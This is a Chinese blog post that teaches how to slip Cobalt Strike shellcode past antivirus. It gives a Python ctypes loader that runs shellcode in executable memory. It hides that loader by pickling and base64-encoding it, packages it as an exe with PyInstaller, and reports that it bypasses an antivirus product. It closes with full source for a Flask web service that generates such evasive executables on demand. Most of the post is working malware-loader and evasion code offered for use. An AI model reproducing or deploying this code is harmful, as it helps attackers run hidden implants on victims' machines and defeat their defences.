<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/7K17qTAZhjbdJ9w_lrrhnA)

**Shellcode 反序列化免杀**

![](https://mmbiz.qpic.cn/mmbiz_gif/Jvbbfg0s6ADzIXbuXSP167y6hVdlNjT283sibat1PnZu8977pJBgMzab0QElf9XGV6k7tHibf4MVe9TglFMbKWQQ/640?wx_fmt=gif)

**_**1**_**

**介绍**

1.  Shellcode 直接操作寄存器 和函数 是一段可注入的指令 来获得攻击目标的 shell
    

2.  Python 序列化 是将一个数据结构转化成一个特殊的序列（特殊的字符串）的过程
    

反序列化就是将这特殊的序列转化成原来的数据结构的过程

**_**2**_**

**Shellcodeloder 编写**

加载 shellcode 需要编写 shellcode 加载器来将 shellcode 在内存中执行

Shellcodeloder 需要做的事是：申请内存局域 -> 将 shellcode 赋值进去 -> 创建线程执行。

在 Python 中编写 shellcodeloder 需要 ctypes 库 (python3 是自带的不需要安装) 来调用 windows 系统中的内置函数几个重要的动态链接库 kernel32.dlluser32.dll gdi32.dll msvcrt.dll 我们编写最基础的 shellcodeloder 的内置函数都在 kernel32.dll 中

函数介绍
----

### VirtualAlloc

VirtualAlloc 函数申请内存地址

### RtlMoveMemory

RtlMoveMemory 函数从指定内存中复制内存至另一内存里

### CreateThread

CreateThread 函数在主线程的基础上创建一个新线程

### WaitForSingleObject

WaitForSingleObject 函数检测线程的状态

函数的用法及参数 百度百科上有详细的资料 可供参考

Python shellcodeloder 编写
------------------------

import ctypes

def shellcodeloder(shellcode):

ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64 // 重载函数返回类型 uint64

ptr=ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x1000),ctypes.c_int(0x40)) // 申请内存区域

buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode) // 将 shellcode 赋值到指针里

ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr),buf,ctypes.c_int(len(shellcode)))// 将 刚才的指针 复制到 申请的内存区域里

hread = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_uint64(ptr),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0))) // 创建新进程执行

ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(thread),ctypes.c_int(-1)) // 检测进程 这里 -1 是等待时间 设为负数它就会无限等待 程序就不会结束

实现 shellcode 执行
===============

在 CobaltStike 生成一个 python 的 shellcode

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADzIXbuXSP167y6hVdlNjT2gsY41bpb3g1LicI2licomHHzYTgBAkqo8suq1ZXpC1CaSWmvoqDJVDdA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADzIXbuXSP167y6hVdlNjT2goRhtgFueibgIBRibeCPUogLfO1zMSMDvjR04HRXcDtNryaYny2jmFpg/640?wx_fmt=png)

拿到一串 buf=‘\xfc\x48\x83\xe4\xf0\xe8\......’

将它转化成 bytes 类型 再转化成 bytearray(list 数据类型) 传入 shellcodeloder 中执行

**_**3**_**

**完整代码**

import ctypes

buf= b '\xfc\x48\x83\xe4\xf0\xe8\......’

def shellcodeloder(shellcode):

ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64 // 重载函数返回类型 uint64

ptr=ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x1000),ctypes.c_int(0x40)) // 申请内存区域

buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode) // 将 shellcode 赋值到指针里

ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr),buf,ctypes.c_int(len(shellcode)))// 将 刚才的指针 复制到 申请的内存区域里

hread = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_uint64(ptr),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0))) // 创建新进程执行

ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(thread),ctypes.c_int(-1)) // 检测进程 这里 -1 是等待时间 设为负数它就会无限等待 程序就不会结束

shellcodeloder(bytearray(buf))

**_**5**_**

**反序列化免杀**

免杀原理
----

序列化就像是一次加密 所以就破坏了原本的特征码 因此免杀

反序列化就是解密 从而执行 我们的 shellcode

代码实现
----

需要 pickle 库 (python 自带无需下载)

我们知道 pickle 可以序列化 python 任意一个数据类型包括一个类

所以我们将上面的 shellcodeloder 归为一个类并用 exec 函数来执行

import pickle,base64,ctypes

class shellcodeloder:

    def __reduce__(self): //__reduce__ 被定义之后，当对象被 Pickle 时就会被调用

        return (exec,("""

ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64

ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x1000),ctypes.c_int(0x40))

buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr),buf,ctypes.c_int(len(shellcode)))

thread = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_uint64(ptr),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))

ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(thread),ctypes.c_int(-1))""",)) // 这里 return 必须要元组类型

pickshell = pickle.dumps(shellcodeloder()) // 序列化 shellcodeloder

basepickshell = base64.b64encode(pickshell) // 再加密 base64

print(basepickshell) // 得到加密后的字符串

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADzIXbuXSP167y6hVdlNjT2HlibK4FNXb9kLVe2rkyWEVqSOh06dXdVEAKDBkD01a4MS2z1SBysDow/640?wx_fmt=png)

然后再将 shellcode 通过 base64 加密

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADzIXbuXSP167y6hVdlNjT2cgHC8wlUtTKllXDibeoVulrgKg5RxsqRN29Rd4ib3ErLbyrIBLdsUomw/640?wx_fmt=png)

加密好后创建新的 py 文件

将加密好的 复制进去 反序列化后就可以执行了

**_**6**_**

**最终代码**

import base64,pickle,ctypes

shellcodeloder = b'gASVdQIAAAAAAACMCGJ1aWx0a……' //shellcodeloder 加密

baseshellcode = b'/EiD5PDoyAAAAEFRQVBSUVZIMdJlSItSY……' //shellcode 加密

shellcode= bytearray(base64.b64decode(baseshellcode)) // 解密 shellcode 此时变量名必须为 shellcode

pickle.loads(base64.b64decode(shellcodeloder))// 解密 shellcodeloder 并执行

测试成功上线

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADzIXbuXSP167y6hVdlNjT2wpLUlC4epZrhLhqcUn3CNWsGj9NBzRyJgz0Pzd2L6xgrKOjmtjBFCA/640?wx_fmt=png)

Pyinstaller 封装成 exe
===================

通过 pip install pyinstaller 命令安装

pyinstaller -F shellcode.py

最后生成的 exe 在 dist 文件夹中

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADzIXbuXSP167y6hVdlNjT2M5hica6g9ew9RktZqfjA1OIeIK4frKiaLS5mYiaaOvJ3csiccqIcop2beQ/640?wx_fmt=png)

免杀过火绒

**_**7**_**

**Flask 编写 shellcode 在线免杀平台**

首先用 pip install flask 命令安装这个库

如果没有学过 flask 的可以网上找教程 学

流程
--

用户提交 CobaltStike 生成的 shellcode -> 后台服务器接收 shellcode 生成反序列化后的 py 文件 -> pyinstaller 封装成 exe-> 供用户下载

开始编写
----

首先创建 html 的模板 index.html 放在 templates 文件夹下

代码如下

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADzIXbuXSP167y6hVdlNjT2fvyyTbz1KyBQZxZF6ykqxnJ6deiab1BxGWmRB7Syzj3EsKACvA2WcWw/640?wx_fmt=png)

Simple simpleverysimple 的 html 模板

一个 form 表单

一个变量代码块用来存放提示句

不必多说大家也能理解  

from flask import Flask,render_template,request

app = Flask(__name__) // 创建 Flask 实例  
@app.route(‘/’,methods=[‘GET’,’POST’]) // 装饰器 语法糖。在这里定义路由地址 和请求方式

def index(): // 被装饰的函数

if request.method == 'POST': // 请求是否为 post 因为 form 提交的方式是 post

shellcode = request.form.get('usershellcode') // 获取用户提交的 shellcode

        if not all([shellcode]): // 如果提交的为空则

nn = '赶紧 提交你的 shellcode 啊 ~！憨批！！

            return render_template('index.html',nn=nn) // 重新加载页面 并将 nn 提示语句插入到 html 模板中的变量代码块

        elif 'buf' not in shellcode: // 如果 buf 没在用户提交的数据内则

            nn = '看 上面 填入的 shellcode 格式啊~！ 笨蛋！！'

            return render_template('index.html', nn=nn)

        elif '"' not in shellcode[::-1][0]: // 如果 用户提交的 shellcode 最后没有双引号则

            nn = 'cao 你的双引号呢？？？'

            return render_template('index.html', nn=nn)

上面的代码 是 获取用户提交的 shellcode 并判断是否规范

规范 后面才好继续处理  

大坑！！！
-----

到这里有个搞了我好久的大坑就是 将 接受到用户传入的 shellcode 转换成二进制 b’string’用 % 将接受到数据的 shellcode 变量传进去可最后得到的结果不一样

如果用 bytes(shellcode,encoding=’UTF-8’)  也是与前两种不一样

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADzIXbuXSP167y6hVdlNjT2dNZoIagsZtFzLNvb9jsdNY28GgwIBPCVVibLX3sibdOmC2BpbNE3kE4A/640?wx_fmt=png)

如果有大佬知道 这是啥情况的 请告诉我 告诉我 告诉我！！

最终我的解决方法是将 拿到的 shellcode 先写入一个 py 文件中进行 base64 加密在这个 py 文件中再去创建一个 最终反序列化的 py 文件

### 最终代码实现

import os

with open('shell.py','w') as f:

f.write('import base64\n')

    f.write("shellcode = b'"+shellcode[7:len(shellcode)-1]+"'\n")

    f.write("baseshellcode = base64.b64encode(shellcode)\n")

    f.write('with open('+"'shellcode.py','w'"+') as f:'+'\n')

    f.write(''+"f.write('import pickle,base64,ctypes \\n')"+'\n')

    f.write(''+"f.write('shellcode ='+str(baseshellcode)+'\\n')"+'\n')

    f.write(''+"""f.write('shellcodeloder = b'+"'gASVdQIAAAAAAACMCGJ1aWx0aW5zlIwEZXhlY5STlFhWAgAACmN0eXBlcy53aW5kbGwua2VybmVsMzIuVmlydHVhbEFsbG9jLnJlc3R5cGUgPSBjdHlwZXMuY191aW50NjQKcHRyID0gY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5WaXJ0dWFsQWxsb2MoY3R5cGVzLmNfaW50KDApLGN0eXBlcy5jX2ludChsZW4oc2hlbGxjb2RlKSksY3R5cGVzLmNfaW50KDB4MTAwMCksY3R5cGVzLmNfaW50KDB4NDApKQpidWYgPSAoY3R5cGVzLmNfY2hhciAqIGxlbihzaGVsbGNvZGUpKS5mcm9tX2J1ZmZlcihzaGVsbGNvZGUpCmN0eXBlcy53aW5kbGwua2VybmVsMzIuUnRsTW92ZU1lbW9yeShjdHlwZXMuY191aW50NjQocHRyKSxidWYsY3R5cGVzLmNfaW50KGxlbihzaGVsbGNvZGUpKSkKdGhyZWFkID0gY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5DcmVhdGVUaHJlYWQoY3R5cGVzLmNfaW50KDApLGN0eXBlcy5jX2ludCgwKSxjdHlwZXMuY191aW50NjQocHRyKSxjdHlwZXMuY19pbnQoMCksY3R5cGVzLmNfaW50KDApLGN0eXBlcy5wb2ludGVyKGN0eXBlcy5jX2ludCgwKSkpCmN0eXBlcy53aW5kbGwua2VybmVsMzIuV2FpdEZvclNpbmdsZU9iamVjdChjdHlwZXMuY19pbnQodGhyZWFkKSxjdHlwZXMuY19pbnQoLTEpKQogICAgICAgIJSFlFKULg=='\\n")"""+'\n') // 反序列化 再 base64 加密过的 shellcodeloder

f.write(''+"f.write('shellcode = bytearray(base64.b64decode(shellcode))\\n')"+'\n')

f.write(''+"f.write('pickle.loads(base64.b64decode(shellcodeloder))\\n')"+'\n')

os.system('python shell.py') // 执行第一个创建的 shell.py

os.system('pyinstaller -F shellcode.py') //pyinstaller 封装第二个通过 执行 shell.py 创建的 shellcode.py

**文件下载 编写**  

from flask import send_from_directory

@app.route("/download") // 定义下载 shellcode.exe 的路由地址为 ip: 端口 /download

def download():

    store_path = os.getcwd()+'\\dist' // 获取 shellcode.exe 的路径

return send_from_directory(store_path, 'shellcode.exe', as_attachment=True)

之后我们上面 index() 函数设返回值为 return redirect("/download") 就是当用户上传完 服务器生成 shellcode.exe 后页面跳转到 ip: 端口 /download 也就是去下载我们的 shellcode.exe

完整代码
----

```
from flask import Flask,render_template,request,send_from_directory,redirect
import os
app = Flask(__name__)

@app.route('/',methods=['GET','POST'])
def index():
    if request.method == 'POST':
        shellcode = request.form.get('usershellcode')
        if not all([shellcode]):
            nn = '赶紧 提交你的shellcode啊 ~！憨批！！'
            return render_template('index.html',nn=nn)
        elif 'buf' not in shellcode:
            nn = '看 上面 填入的 shellcode 格式啊~！ 笨蛋！！'
            return render_template('index.html', nn=nn)
        elif '"' not in shellcode[::-1][0]:
            nn = 'cao 你的双引号呢？？？'
            return render_template('index.html', nn=nn)
        else:
            with open('shell.py','w') as f:
                f.write('import base64\n')
                f.write("shellcode = b'"+shellcode[7:len(shellcode)-1]+"'\n")
                f.write("baseshellcode = base64.b64encode(shellcode)\n")
                f.write('with open('+"'shellcode.py','w'"+') as f:'+'\n')
                f.write('   '+"f.write('import pickle,base64,ctypes \\n')"+'\n')
                f.write('   '+"f.write('shellcode = '+str(baseshellcode)+'\\n')"+'\n')
                f.write('   '+"""f.write('shellcodeloder = b'+"'gASVdQIAAAAAAACMCGJ1aWx0aW5zlIwEZXhlY5STlFhWAgAACmN0eXBlcy53aW5kbGwua2VybmVsMzIuVmlydHVhbEFsbG9jLnJlc3R5cGUgPSBjdHlwZXMuY191aW50NjQKcHRyID0gY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5WaXJ0dWFsQWxsb2MoY3R5cGVzLmNfaW50KDApLGN0eXBlcy5jX2ludChsZW4oc2hlbGxjb2RlKSksY3R5cGVzLmNfaW50KDB4MTAwMCksY3R5cGVzLmNfaW50KDB4NDApKQpidWYgPSAoY3R5cGVzLmNfY2hhciAqIGxlbihzaGVsbGNvZGUpKS5mcm9tX2J1ZmZlcihzaGVsbGNvZGUpCmN0eXBlcy53aW5kbGwua2VybmVsMzIuUnRsTW92ZU1lbW9yeShjdHlwZXMuY191aW50NjQocHRyKSxidWYsY3R5cGVzLmNfaW50KGxlbihzaGVsbGNvZGUpKSkKdGhyZWFkID0gY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5DcmVhdGVUaHJlYWQoY3R5cGVzLmNfaW50KDApLGN0eXBlcy5jX2ludCgwKSxjdHlwZXMuY191aW50NjQocHRyKSxjdHlwZXMuY19pbnQoMCksY3R5cGVzLmNfaW50KDApLGN0eXBlcy5wb2ludGVyKGN0eXBlcy5jX2ludCgwKSkpCmN0eXBlcy53aW5kbGwua2VybmVsMzIuV2FpdEZvclNpbmdsZU9iamVjdChjdHlwZXMuY19pbnQodGhyZWFkKSxjdHlwZXMuY19pbnQoLTEpKQogICAgICAgIJSFlFKULg=='\\n")"""+'\n')
                f.write('   '+"f.write('shellcode = bytearray(base64.b64decode(shellcode))\\n')"+'\n')
                f.write('   '+"f.write('pickle.loads(base64.b64decode(shellcodeloder))\\n')"+'\n')
            os.system('python shell.py')
            os.system('pyinstaller -F shellcode.py')
            return redirect("/download")
    return render_template('index.html')
@app.route("/download")
def download():
    store_path = os.getcwd()+'\\dist'
    return send_from_directory(store_path, 'shellcode.exe', as_attachment=True)
app.run()
```

**_**8**_**

**结语**

我是学习一年半还不会开机的菜逼

第一次写文章很鸡冻 。老师傅们 轻点喷

也希望圈内的漂亮大姐姐们 能喜欢我的 第一次的文章

谢谢大家~！

**_**9**_**

**关注  
**

  
本公众号 更新类文章和视频 欢迎关注

![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ADzIXbuXSP167y6hVdlNjT21iclfmcmIvRAJOupJ0L0whuVCv8GzZHeg7cW6RRicgvP8TCpTGjMaTmQ/640?wx_fmt=jpeg)